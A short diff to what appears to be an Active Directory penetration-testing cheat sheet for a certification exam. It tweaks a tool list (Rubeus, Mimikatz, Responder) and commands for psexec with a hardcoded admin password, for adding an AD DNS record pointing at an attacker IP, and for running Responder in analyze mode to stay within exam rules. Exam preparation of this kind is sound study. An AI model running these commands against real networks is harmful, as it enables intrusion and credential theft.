@@ -44,7 +44,7 @@ Be sure to check the restrictions on the use of tools before taking the exam.
 - Powerview
 - Rubeus
 - evil-winrm
-- Responder (Poisoning and Spoofing is not allowed in the labs or on the exam)
+- Responder (Poisoning and spoofing are not allowed in the labs or on the exam.)
 - Crackmapexec
 - Mimikatz
 
@@ -479,7 +479,9 @@ psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.
 # add AD Integrated DNS records
 python3 dnstool.py -u '<domain>\<username>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
 # get information in a few minutes 
-responder -I tun0 # not allowed in the labs or on the exam
+sudo responder -I tun0 -A -v 
+# because poisoning and spoofing are not allowed in the labs or on the exam, using -A to run in analyze mode
+# using -v to show the hash every time
 ```
 
 ### :open_file_folder: Extracting
